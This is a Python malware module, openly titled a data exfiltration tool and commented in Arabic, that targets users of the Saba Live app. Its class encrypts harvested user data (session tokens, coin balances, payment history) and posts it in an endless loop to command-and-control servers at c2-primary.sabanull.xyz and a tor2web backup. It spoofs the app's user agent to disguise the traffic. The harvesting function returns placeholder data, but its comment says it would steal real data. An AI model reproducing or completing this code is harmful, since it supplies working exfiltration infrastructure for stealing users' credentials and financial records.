#!/usr/bin/env python3
# Data Exfiltration Module

import json
import base64
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import hashlib

class DataHarvester:
    def __init__(self):
        self.encryption_key = hashlib.sha256(
            datetime.now().strftime("%Y%m%d").encode()
        ).digest()
        
    def encrypt_data(self, data):
        """تشفير البيانات قبل الإرسال"""
        cipher = AES.new(self.encryption_key, AES.MODE_GCM)
        
        if isinstance(data, dict):
            data = json.dumps(data)
        if isinstance(data, str):
            data = data.encode()
            
        ciphertext, tag = cipher.encrypt_and_digest(data)
        
        return {
            'nonce': base64.b64encode(cipher.nonce).decode(),
            'tag': base64.b64encode(tag).decode(),
            'data': base64.b64encode(ciphertext).decode()
        }
        
    def harvest_app_data(self):
        """حصاد بيانات التطبيق"""
        # هذه وظيفة وهمية - في الواقع ستسرق البيانات الحقيقية
        fake_data = {
            'app': 'Saba Live',
            'user_id': 'user_123456',
            'session_token': 'tok_abcdef123456',
            'coin_balance': 15000,
            'premium_status': False,
            'vip_level': 2,
            'friends_list': ['user1', 'user2', 'user3'],
            'payment_history': [
                {'date': '2024-01-15', 'amount': 9.99, 'coins': 1000},
                {'date': '2024-02-01', 'amount': 19.99, 'coins': 2500}
            ]
        }
        
        return fake_data
        
    def exfiltrate(self, data, endpoint):
        """إرسال البيانات إلى سيرفر C2"""
        import requests
        
        encrypted = self.encrypt_data(data)
        
        try:
            response = requests.post(
                endpoint,
                json=encrypted,
                headers={
                    'User-Agent': 'SabaLive/5.2.1',
                    'Content-Type': 'application/json'
                },
                timeout=5
            )
            
            return response.status_code == 200
        except:
            return False
            
    def continuous_harvesting(self, interval=60):
        """حصاد مستمر للبيانات"""
        import time
        
        endpoints = [
            'https://c2-primary.sabanull.xyz/collect',
            'https://backup-c2.tor2web.io/data'
        ]
        
        while True:
            try:
                data = self.harvest_app_data()
                
                for endpoint in endpoints:
                    success = self.exfiltrate(data, endpoint)
                    if success:
                        print(f"[+] Data exfiltrated to {endpoint}")
                        break
                        
                time.sleep(interval)
            except Exception as e:
                print(f"[-] Harvesting failed: {e}")
                time.sleep(interval * 2)
